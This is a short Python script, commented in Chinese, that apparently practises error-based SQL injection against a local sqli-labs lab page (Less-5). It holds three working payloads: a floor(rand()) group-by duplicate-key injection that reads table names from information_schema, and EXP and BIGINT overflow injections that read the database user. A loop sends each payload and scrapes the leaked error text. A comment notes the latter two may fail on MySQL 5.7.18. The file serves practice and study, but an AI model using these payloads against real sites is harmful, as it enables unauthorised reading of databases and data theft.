#! /usr/bin/env python
# encoding=utf-8
"""
基于报错的注入,原理大概就是计数重复，关键函数就是rand(),floor()
"""

import requests
from lxml import etree
url = "http://127.0.0.1/Less-5?id=1\'"

#payload = 'union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0) *2))a from information_schema.columns group by a --+'
payload_common = "union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.tables group by a --+"
"""
不知道是不是5.7.18修了还是怎么样，下面两个payload好像再怎么变，都不行，如果有谁在5.7.18以上测试成功求交流
"""
payload_double = "union select (exp(~(select * from (select user())a))),2,3 --+"
payload_bigint = "union select (!(select * from (select user())x) - ~0),2,3 --+"
payload = []
payload.append(payload_common)
payload.append(payload_double)
payload.append(payload_bigint)

for i in payload:

    req = requests.get(url + i).text

    res = etree.HTML(req)
    result = res.xpath('//font/text()')
    print result